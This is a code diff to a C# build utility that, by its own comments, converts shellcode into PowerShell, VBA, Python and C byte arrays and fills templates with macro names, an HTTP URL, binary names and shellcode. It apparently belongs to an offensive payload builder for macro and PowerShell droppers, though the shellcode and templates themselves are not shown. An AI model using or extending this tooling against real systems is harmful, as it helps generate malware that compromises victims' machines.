@@ -3,12 +3,13 @@ using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using System.Text.RegularExpressions;
 
 
 
-//I just want the world to know that I wrote this by hand. Then AI told me I sucked and rewrote it better.
+//I just want the world to know that I wrote this by hand. Then AI told me I sucked and rewrote it better. Then I ruined it again.
 
-//This project builds last, converts shellcode syntax, populates templates, and movs all the artifacts to a unified location.
+//This project builds last, converts shellcode syntax, populates templates, and moves all the artifacts to a unified location.
 
 namespace Build
 {
@@ -20,9 +21,7 @@ namespace Build
 
         private static int Main(string[] args)
         {
-
-            Console.WriteLine(ConvertByteCode(CONFIG.SHELLCODE,ByteCodeLang.ps1));
-
+            BuildTemplates(args);
 
             if (args.Length < 1 || string.IsNullOrWhiteSpace(args[0]))
             {
@@ -31,6 +30,8 @@ namespace Build
             }
 
             ConsolidateArtifacts(args);
+
+            BuildTemplates(args);
 
 
 
@@ -41,7 +42,7 @@ namespace Build
         {
             StringBuilder sb = new StringBuilder();
 
-            string varname = "mybuff";
+            string varname = CONFIG.SHELLCODE_NAME;
             int width = 30;
             int count = 0;
 
@@ -245,7 +246,6 @@ namespace Build
             Console.WriteLine($"Copied: {source} -> {destination}");
         }
     
-        
         public enum ByteCodeLang
         {
             vba,
@@ -254,5 +254,49 @@ namespace Build
             python
 
         }
+
+        private static void BuildTemplates(string[] args)
+        {
+            if (!Directory.Exists($"{args[0]}\\Artifacts"))
+            {
+                Directory.CreateDirectory($"{args[0]}\\Artifacts");
+            }
+
+            string[] files = Directory.GetFiles($"{args[0]}\\Templates");
+            foreach (string f in files)
+            {
+                FileInfo fi = new FileInfo(f);
+                string text = File.ReadAllText(fi.FullName);
+
+                text = text.Replace("{MACRO_NAME}", CONFIG.MACRO_NAME);
+                text = text.Replace("{HTTP_URL}", CONFIG.HTTP_URL);
+                text = text.Replace("{BINARY_NAME}", CONFIG.BINARY_NAME);
+                text = text.Replace("{WAIT_TIME_SECONDS}", CONFIG.WAIT_TIME_SECONDS);
+                text = text.Replace("{POWERSHELL_SCRIPT_NAME}", CONFIG.POWERSHELL_SCRIPT_NAME);
+                text = text.Replace("{SHELLCODE_NAME}", CONFIG.SHELLCODE_NAME);
+
+
+                //Convert shellcode strings to appropriate language
+                if (fi.Extension == ".ps1")
+                {
+                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.ps1));
+                } else if (fi.Extension == ".vba") 
+                {
+                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.vba));
+                } else if (fi.Extension == ".py")
+                {
+                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.python));
+                } else if (fi.Extension == ".c" || fi.Extension == ".cpp" || fi.Extension == ".h" || fi.Extension == ".hpp") 
+                {
+                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.c));
+                }
+
+                //Write to artifacts folder
+                string nf = f.Replace("Templates", "Artifacts");
+                File.WriteAllText(nf, text);
+            }
+
+        }
+    
     }
 }
